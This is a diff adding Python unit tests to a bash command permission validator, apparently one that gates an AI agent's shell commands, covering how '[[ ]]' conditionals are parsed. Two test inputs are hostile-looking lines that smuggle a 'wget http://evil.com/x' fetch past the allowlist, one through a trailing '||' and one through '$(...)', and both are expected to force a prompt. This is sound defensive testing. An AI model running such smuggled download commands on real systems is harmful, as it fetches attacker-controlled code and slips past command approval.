@@ -758,6 +758,48 @@ class TestCaseArmPatternLabels(unittest.TestCase):
         self.assertEqual(result["decision"], "ask")
 
 
+class TestConditionalExpression(unittest.TestCase):
+    """Inside `[[ ]]`, &&/||/| are conditional connectors (not command
+    separators), so the whole test must validate as one sub-command rather than
+    being split into fragments that match no allow pattern."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_double_bracket_with_or_is_one_command(self):
+        self.assertEqual(
+            self.parser.parse_compound_command(
+                '[[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]'),
+            ['[[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]'])
+
+    def test_for_loop_with_conditional_allowed(self):
+        """The real-world headless test-runner loop no longer forces a prompt."""
+        result = self.validator.validate_bash_command(
+            'for t in tests/*.gd; do\n'
+            '  ec=$?\n'
+            '  if [[ "$ec" -ne 0 || "${nfail:-0}" -ne 0 ]]; then\n'
+            '    fail=$((fail+1))\n'
+            '  else\n'
+            '    pass=$((pass+1))\n'
+            '  fi\n'
+            'done')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_connector_after_closing_bracket_still_splits(self):
+        """`]] || cmd` — the connector outside the conditional still separates."""
+        result = self.validator.validate_bash_command('[[ -f x ]] || wget http://evil.com/x')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_command_substitution_inside_conditional_still_validated(self):
+        """A `$(...)` inside `[[ ]]` is still extracted and validated on its own,
+        so a non-allowlisted command there still forces a prompt."""
+        result = self.validator.validate_bash_command('[[ $(wget http://evil.com/x) ]]')
+        self.assertEqual(result["decision"], "ask")
+
+
 class TestAskReasonNamesUnknownCommands(unittest.TestCase):
     """The prompt shown to the user names the specific non-allowlisted
     sub-commands instead of a generic 'unknown or empty' string."""
